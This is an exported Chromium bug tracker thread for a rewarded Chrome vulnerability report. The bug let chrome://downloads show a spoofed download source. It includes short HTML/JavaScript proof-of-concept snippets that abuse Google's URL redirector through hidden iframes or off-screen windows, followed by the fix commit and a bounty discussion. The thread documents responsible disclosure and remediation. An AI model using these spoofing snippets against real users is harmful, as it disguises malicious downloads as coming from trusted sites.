# Incorrect security UI of files' download source at chrome://downloads

| Field | Value |
|-------|-------|
| **Issue ID** | [352681108](https://issues.chromium.org/issues/352681108) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | UI>Browser>Downloads |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | zy...@gmail.com |
| **Assignee** | dr...@chromium.org |
| **Created** | 2024-07-12 |
| **Bounty** | $2,000.00 |

## Description

---

### Report description

Incorrect security UI of files' download source at chrome://downloads

---

### Bug location

#### Where do you want to report your vulnerability?

Chrome VRP – Report security issues affecting the Chrome browser. [See program rules](https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules)

---

### The problem

#### Please describe the technical details of the vulnerability

Generally, when using Chrome, the chrome://downloads page displays the download source of a file.

For instance, if we download Chrome from `https://www.google.com/intl/en_uk/chrome/browser-tools/`, the `From` field on the `chrome://downloads` page will show `From https://www.google.com`. However, the actual download source for Chrome is `https://dl.google.com/chrome/mac/universal/stable/GGRO/googlechrome.dmg`. **Please take a look at the 1.png: [image:https://storage.googleapis.com/bughunters-public/attachments/670a8a29-52c8-4989-9a7f-ef1dd86ba5ae-1.png]**

So it appears that Chrome utilizes the `referer` header value as the source in the `From` field. I think this approach may introduce certain security risks.

#### Reproduce:

1. Try the following html(I host it at <http://192.168.1.113/vuln.html>):

```
<h1>
<a href="https://dl.google.com/chrome/mac/universal/canary/googlechromecanary.dmg">click to download chrome canary</a>
</h1>

```

If you click the above link, the `From` field will show `From http://192.168.1.113` instead of `https://dl.google.com`. **Please take a look at the 2.png: [image:https://storage.googleapis.com/bughunters-public/attachments/6b3fd247-d77b-4109-87a6-da9ee54d6186-2.png]**

2. Try open the following google docs link `https://docs.google.com/document/d/1vXg4oOAwPk8tdejYZjkEd2SwMkGxf_XXC619mB5sOK0`, and right-click on the link in the body text and select the 'Open Link' option.

The link points to `https://cdn.androidcombo.com/com.roblox.client/Roblox_2.629.609_apkcombo.com.apk?ecp=Y29tLnJvYmxveC5jbGllbnQvMi42MjkuNjA5LzE2MzIuZGY2MzQxNjc2NzVjMTIwN2Y2YzkwOWZjNjk1NjA4NzY4YmMyMzA2OS5hcGs%3D&iat=1720768260&sig=2a395e3cac47633cfcc3ba33fe3794b5&size=177578364&from=cf&version=latest&lang=en&fp=784941ae73339d1ccaff3c0387d755c2&ip=219.78.127.215`.

The `From` field will show `From https://www.google.com instead of` [https://cdn.androidcombo.com`](https://cdn.androidcombo.com%60).

**Please take a look at the 3.png: [image:https://storage.googleapis.com/bughunters-public/attachments/8912da1b-c2e1-4639-ae06-9f800ad63e64-3.png]**

#### Please briefly explain who can exploit the vulnerability, and what they gain when doing so

Misleading users about the true source of a file download, leading them to mistakenly trust a malicious file.

---

### The cause

#### What version of Chrome have you found the security issue in?

128.0.6589.0 (Official Build) canary (arm64)

#### Is the security issue related to a crash?

No

#### Choose the type of vulnerability

Security UI Spoofing

#### How would you like to be publicly acknowledged for your report?

Wester

## Attachments

- [2.png](attachments/2.png) (image/png, 40.3 KB)
- [3.png](attachments/3.png) (image/png, 50.7 KB)
- [1.png](attachments/1.png) (image/png, 46.7 KB)
- [malicious_apk.png](attachments/malicious_apk.png) (image/png, 43.5 KB)
- [google.html](attachments/google.html) (text/html, 331 B)
- [PoC_video.mov](attachments/PoC_video.mov) (video/quicktime, 3.6 MB)

## Timeline

### dr...@chromium.org (2024-07-16)

This was an intentional behavior change in <https://crbug.com/40280033>. We believe the download referrer is more useful to users than the actual site hosting the file. Especially in the presence of CDN's like your 3.png, you make the trust decision about whether to download the file based on the site you're on when you download (docs.google.com), not what CDN origin is hosting the file. When they later go back to reference where a download came from, it's not useful to show them a URL they never saw or interacted with.

If you have a way for a site to spoof this to falsify that trust (e.g. you click "download" on evil[.]com, but chrome://downloads shows safe[.]com), we'd be interested.

+kmenglin@ for awareness.

### zy...@gmail.com (2024-07-19)

If you have a way for a site to spoof this to falsify that trust (e.g. you click "download" on evil[.]com, but chrome://downloads shows safe[.]com), we'd be interested.

=========================

It's straightforward. We just need a URL redirect for safe[.]com. For example:

**Open `https://ybt01.github.io/upload/google.html` and click the link.**

The malicious apk file was hosted on `https://github.com/ybt01/ybt01.github.io/blob/master/upload/app-debug.apk`, but chrome://downloads shows it was downloaded from "<https://www.google.com>"

### zy...@gmail.com (2024-07-23)

Hi, please take a look at the above new PoC, thanks!

### dr...@chromium.org (2024-07-23)

Thanks! Let me reopen this so it can go back into our security triage queue. Can you upload your new PoC in the bug tracker to make triage go more smoothly?

### zy...@gmail.com (2024-07-23)

Sure, just wait a moment!

### ma...@chromium.org (2024-07-24)

[security shepherd]

The PoC uses the <https://www.google.com/url> redirector to convince the download subsystem that google.com was the source of the download. I've confirmed that this reproduces in Chrome 128.0.6601.2 on macOS.

```
<a href="#" onclick="poc()">click me to download google apk</a>
<script>
    function poc(){
        window.open("https://www.google.com/url?q=https://ybt01.github.io/upload/app-debug.apk&sa=D&source=buganizer&usg=AOvVaw3nm-qJSzcGfjAOwSO0tcBK","qq","scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,width=100,height=100,left=-1000,top=-1000");
    
    }
</script>

```

Setting severity to S2 based on previous issues related to misleading data in chrome://downloads. Found In is 127 as that's the first milestone that contains the changes for <https://crbug.com/40280033>.

Assigning to kmenglin@.

### zy...@gmail.com (2024-07-24)

Sorry for the delay! Since it was late at night in our country at that time, I uploaded it now.

The following PoC is better,it ensures that the victim remains unaware of any windows associated with Google's domains, but the file does show it is from `https://www.google.com`.

---

Chrome version: 128.0.6613.0 canary
PoC code:

```
<a href="#" onclick="poc()">click me to download google apk</a>
<script>
    function poc(){
    document.getElementById("ifr").src="https://www.google.com/url?q=https://ybt01.github.io/upload/app-debug.apk&sa=D&source=buganizer&usg=AOvVaw3nm-qJSzcGfjAOwSO0tcBK";
    }
</script>
<iframe id="ifr" src style="display:none"></iframe>

```

### zy...@gmail.com (2024-07-24)

The URL redirect is a very common web vulnerability, present in the domain names of nearly every major company. Any URL redirect on safe[.]com could result in the same attack effects as mentioned above.

### pe...@google.com (2024-07-24)

Thank you for providing more feedback. Adding the requester to the CC list.

### pe...@google.com (2024-07-24)

Setting milestone because of s2 severity.

### pe...@google.com (2024-07-24)

Setting Priority to P1 to match Severity s2. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### zy...@gmail.com (2024-07-25)

And using the method from [comment #5](https://issues.chromium.org/issues/352681108#comment5), the harmful file download warning from Google Safe Browsing can also be bypassed, because <https://www.google.com> is a trusted domain. This vulnerability could easily be exploited by some malicious websites in the wild.

### dr...@chromium.org (2024-07-25)

I don't think this bypasses Safe Browsing. I have confirmed that a ping is sent to Safe Browsing when downloading the file.

But the "download referrer URL" did not have the semantics we expected. I agree that the current implementation is clearly incorrect.

### zy...@gmail.com (2024-07-26)

Okay, thanks!

### dr...@chromium.org (2024-08-07)

Just a quick update here since I've been silent a while. I am in conversations internally about the right behavior for URLs on chrome://downloads. My team's stance is that the historical behavior of telling users which URL the bytes were fetched from is not useful. The user doesn't necessarily interact with that site (CDNs, for example), and seeing a URL you've never seen before on chrome://downloads doesn't help you make security decisions. But that means we're having to re-evaluate the security boundaries here, and that will take some time.

### zy...@gmail.com (2024-08-08)

Yeah, this is indeed a tricky issue, for example, when you download a file from apkpure.com, Firefox/Safari actually shows the download source as the CDN domain winudf.com, a domain that users are clearly unaware of.

So the chrome://downloads could display as follows(it's just my personal suggestion), using the PoC in my [comment #8](https://issues.chromium.org/issues/352681108#comment8) as an example:

```
app-debug.apk

From: https://www.google.com
Actually file location: https://ybt01.github.io
Safety: Not from the original website

```

### ap...@google.com (2024-08-19)

Project: chromium/src
Branch: main

commit 8f50d6c2de7057bceb65794399c3aa0ecb033a28
Author: Daniel Rubery <drubery@chromium.org>
Date:   Mon Aug 19 23:11:02 2024

    Don't show referrer URL without user gesture
    
    Downloads can be initiated by an open redirect, putting the redirecting
    domain on chrome://downloads. Since the user has never interacted with
    that download, it's not a very useful URL. This CL stops populating it
    in that case.
    
    Bug: 352681108
    Change-Id: Ib6a342b303bd367084a34e5bdde87ee8712c2201
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5798342
    Reviewed-by: Xinghui Lu <xinghuilu@chromium.org>
    Commit-Queue: Daniel Rubery <drubery@chromium.org>
    Cr-Commit-Position: refs/heads/main@{#1343830}

M       chrome/browser/ui/webui/downloads/downloads_list_tracker.cc
M       chrome/browser/ui/webui/downloads/downloads_list_tracker_unittest.cc

https://chromium-review.googlesource.com/5798342


### dr...@chromium.org (2024-08-19)

[#comment18](https://issues.chromium.org/issues/352681108#comment18) isn't a great solution, since it just makes the URL blank when the user didn't interact with the referrer. But it definitely prevents "google.com" from showing up when the user didn't interact with Google, so marking Fixed from the security bug perspective.

### zy...@gmail.com (2024-08-20)

Can the following PoC bypass the patch for [#comment18](https://issues.chromium.org/issues/352681108#comment18)? In fact, I interacted with `https://www.google.com`.

```
<script>
    function poc(){
    document.getElementById("ifr").src="https://www.google.com/url?q=https://ybt01.github.io/upload/app-debug.apk&sa=D&source=buganizer&usg=AOvVaw3nm-qJSzcGfjAOwSO0tcBK";
    document.getElementById("ifr").style="display:none";
    }
</script>
<iframe id="ifr" src="https://www.google.com/csi" onmouseover="poc()" width="90%" height="80%"></iframe>

```

### dr...@chromium.org (2024-08-20)

It doesn't seem to. The network request that actually initiates the download is when the JS on google.com does the redirect. That one is always executing without user interaction on pageload, which is why I'm expecting [#comment18](https://issues.chromium.org/issues/352681108#comment18) is sufficient.

You're welcome to try it out though. [#comment18](https://issues.chromium.org/issues/352681108#comment18) has released in Chrome Canary after 129.0.6668.0: <https://chromiumdash.appspot.com/commit/8f50d6c2de7057bceb65794399c3aa0ecb033a28>

### zy...@gmail.com (2024-08-21)

Sure, I'll try it.

### zy...@gmail.com (2024-08-21)

I confirm [#comment18](https://issues.chromium.org/issues/352681108#comment18) could fix this bug on canary 129.0.6668.9, I have tried different PoCs but have not found a bypass yet.

### zy...@gmail.com (2024-08-21)

But it seems like a temporary solution; how Chrome://downloads displays secure download sources is still a long-term issue to consider.

### dr...@chromium.org (2024-08-21)

Completely agreed. We'll continue to iterate on that. I think "user interacted with site" is a decent heuristic for whether the URL is suitable for display on chrome://downloads, but we lose some sites in the process.

### sp...@google.com (2024-08-28)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $2000.00 for this report.

Rationale for this decision:
lower impact security UI issue / spoof


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.

### am...@chromium.org (2024-08-29)

Congratulations Wester! Thank you for your efforts and reporting this issue to us.

### zy...@gmail.com (2024-08-29)

Thanks for the bounty, Amy!

I would like to inquire if this should be classified as a Moderate impact.

Downloading files is a **basic function** of Chrome, and this vulnerability does not require users to make additional configurations or extra operations. **It only needs users to click one link to download a file following normal logic; the file will appear to be from <https://www.google.com>.**

This is very useful for websites distributing malicious software, especially for APT groups using C2 servers to store trojans.

### zy...@gmail.com (2024-08-29)

Cases like the UI spoofing I previously submitted should actually be considered lower impact because they require multiple interactions from the user.

- <https://issues.chromium.org/issues/40053465>
- <https://issues.chromium.org/issues/40053536>

Then I promptly verified the fix for this vulnerability on Canary. Has there been an improvement in the quality of reporting?

### am...@chromium.org (2024-08-29)

While the downloading files is an expected function of web browsing and we agree that the implementation to the prior fix was not optimal or desirable to allow for the incorrect original to be displayed in the Download History, there is clear correct origin / URL displayed to the user at the time they are making the download decision, which primarily when the user would decide if a download is acceptable. This is why this issue in and of itself was classified as `lower impact` in our reward decision.

re: c#29, I would definitely say that the previous UI spoof you reported and linked were indeed considered to be lower impact by us as each only resulted in a $500 reward versus the $2,000 reward for this issue. We just weren't using the phrasing "lower impact" or "moderate impact" in our reward decisions at that time since this is related to our updated reward structure launched yesterday.

I will also convey that we did discuss this issue thoroughly in our assessment yesterday, but we are happy to take another look at a forthcoming reward panel session.

### zy...@gmail.com (2024-08-30)

Got it, thanks for your clarification!

The impact of UI spoofing is indeed not as straightforward as memory corruption vulnerabilities, but there have been other reports of deceiving the download source domain with a high impact, as referenced in `https://issues.chromium.org/issues/40055527[$7,500]`.

This vulnerability is similar to mine. When clicking a link from a malicious website, the download source appears as [www.google.com](http://www.google.com).

### zy...@gmail.com (2024-09-19)

Hi Amy, is there any progress here? This vulnerability is very useful to distribute malicious software and trojans on the browser side. I think the current rating is a bit low.

### am...@chromium.org (2024-10-03)

Hello, thanks again for the report and apologies for the delay in getting this reassessed. In light of no new information being presented (and merely the suggestion, without any demonstration) that this would a useful distribution method for malicious software, we have determined that the original reward is sufficient based on the overall impact and issue demonstrated in this report.

### zy...@gmail.com (2024-10-08)

Okay, thanks for your reply!

### pe...@google.com (2024-11-26)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

### ha...@gmail.com (2025-01-17)

deleted

### re...@gmail.com (2025-10-29)

deleted

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/352681108)*
